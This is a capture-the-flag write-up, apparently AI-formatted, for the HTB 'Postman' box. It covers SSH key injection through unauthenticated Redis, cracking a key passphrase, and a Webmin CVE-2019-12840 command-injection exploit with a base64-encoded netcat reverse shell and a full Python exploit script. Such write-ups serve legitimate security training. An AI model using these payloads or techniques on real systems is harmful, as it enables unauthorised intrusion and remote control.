## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)
**Tags:** `redis`, `Webmin`, `ssh`, `key cracking`, `privesc`, `CVE-2019-12840`

---

## 📡 Recon

### Nmap Scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.160
nmap -p 22,80,6379,10000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.160
```

- **Ports:**  
  - `22/tcp`: [OpenSSH 7.6](SSH)
  - `80/tcp`: [Apache 2.4.29](HTTP)
  - `6379/tcp`: Redis 4.0.9  
  - `10000/tcp`: Webmin (MiniServ 1.910)  

---

## 🌐 Web Enumeration

### Port 80

- Basic HTML page (under construction)
- Gobuster:

```bash
gobuster dir -u http://10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php
```

- Found: `/upload`, `/images`, `/fonts`, `/css`, `/js` — but all uninteresting

### Port 10000 (Webmin)

- Webmin login on HTTPS
- Hostname: `postman` from redirect
- Default login page shown
- No useful links via HTTP

---

## 🔧 Redis Enumeration (TCP 6379)

### Basic Commands

```bash
redis-cli -h 10.10.10.160
> keys *
> config get dir
> config set dir ./.ssh
```

### Inject SSH Key

```bash
ssh-keygen -f ~/id_rsa_generated
(echo -e "\n\n"; cat ~/id_rsa_generated.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set 0xdf
```

### Save DB to `.ssh/authorized_keys`

```bash
redis-cli -h 10.10.10.160
> config set dbfilename "authorized_keys"
> save
```

---

## 🐚 Shell as redis

```bash
ssh -i ~/id_rsa_generated redis@10.10.10.160
```

✅ Shell as `redis`  
🧾 Look for `.ssh/authorized_keys` to confirm injection

---

## 👤 Priv Esc: redis → Matt

### Found Encrypted SSH Key

```bash
ls -l /opt/id_rsa.bak
```

### Crack Key

```bash
/opt/john/run/ssh2john.py id_rsa.bak > id_rsa.john
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
# Passphrase: computer2008
```

### Cannot SSH (Denied in `/etc/ssh/sshd_config`)

```bash
# grep DenyUsers /etc/ssh/sshd_config
DenyUsers Matt
```

### Switch User with `su`

```bash
su Matt
# Password: computer2008
```

✅ Shell as `Matt`  
📄 `cat /home/Matt/user.txt`

---

## 🔓 Priv Esc: Matt → root (via Webmin)

### Login to Webmin

```bash
https://10.10.10.160:10000/
# Username: Matt
# Password: computer2008
```

✅ Access only to “Package Updates” module

### Exploit: CVE-2019-12840 (Webmin RCE)

- POST to:

```http
POST /package-updates/update.cgi
```

- Data:

```http
u=acl/apt
u= | bash -c "base64 payload | base64 -d | bash"
ok_top=Update Selected Packages
```

### Reverse Shell Payload (Base64 Encoded)

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f' | base64
```

### Python Exploit Example

```python
import requests
import html
import re

s = requests.session()
s.post('https://10.10.10.160:10000/session_login.cgi',
       data={'page':'', 'user':'Matt', 'pass':'computer2008'},
       verify=False)

payload = 'echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNiA0NDMgPi90bXAvZgo=|base64 -d|bash -i'

resp = s.post('https://10.10.10.160:10000/package-updates/update.cgi',
              data=[('u','acl/apt'), ('u', f' | bash -c "{payload}"'), ('ok_top','Update Selected Packages')],
              headers={'Referer':'https://10.10.10.160:10000/'},
              verify=False)

print(html.unescape(re.findall('<pre>(.*)</pre>', resp.text, re.DOTALL)[0]))
```

---

## ⚙️ Shell as root

```bash
nc -lvnp 443
```

✅ Reverse shell connects as root  
📄 `cat /root/root.txt`

---

## 🧠 Beyond Root: Why Metasploit Redis Exploit Failed

### Exploit:

```bash
use exploit/linux/redis/redis_unauth_exec
```

### Issue:

- Redis throws:

```
-ERR unknown command 'MODULE'
```

### Reason:

```bash
grep MODULE /etc/redis/redis.conf
rename-command MODULE ""
```

✅ Redis `MODULE` command is **disabled**

---

Let me know if you'd like this in collapsible Obsidian format or with code snippets styled for GitHub readmes!